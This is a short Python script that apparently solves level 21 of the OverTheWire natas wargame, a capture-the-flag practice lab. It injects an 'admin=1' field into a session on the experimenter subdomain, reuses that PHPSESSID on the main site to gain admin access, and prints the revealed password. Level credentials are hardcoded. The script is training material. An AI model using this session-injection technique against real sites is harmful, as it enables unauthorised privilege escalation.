import requests
import re

username = "natas21"
password = "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU"
url = 'http://%s.natas.labs.overthewire.org/' % username
exp = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true'

session = requests.session()

payload = {"submit":"Update","admin":"1"}
responseB = session.post(exp, auth=(username,password),data=payload)
oldCookie = session.cookies["PHPSESSID"]

response = session.get(url, auth=(username,password), cookies={"PHPSESSID":oldCookie})

#print(responseB.text)
print (re.findall("Password: (.*)</pre>",response.text)[0])
